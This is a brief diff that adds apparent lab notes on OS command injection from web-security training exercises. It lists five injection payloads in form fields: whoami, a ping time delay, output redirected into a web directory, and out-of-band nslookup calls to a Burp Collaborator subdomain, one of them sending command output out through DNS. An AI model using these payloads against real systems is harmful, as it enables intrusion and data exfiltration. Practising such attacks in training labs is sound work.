@@ -1,0 +1,16 @@
+labs
+1.os command injection simple case
+1|whoami.
+
+2.blind os command injectio with time delay
+email=x||ping+-c+10+127.0.0.1||
+
+3.blind os cmdi using file read ans file redirect
+email=||whoami>/var/www/images/output.txt||
+filename=output.txt
+
+4.Exploiting blind OS command injection using out-of-band (OAST) techniques
+email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+
+5.oast for data exfil
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
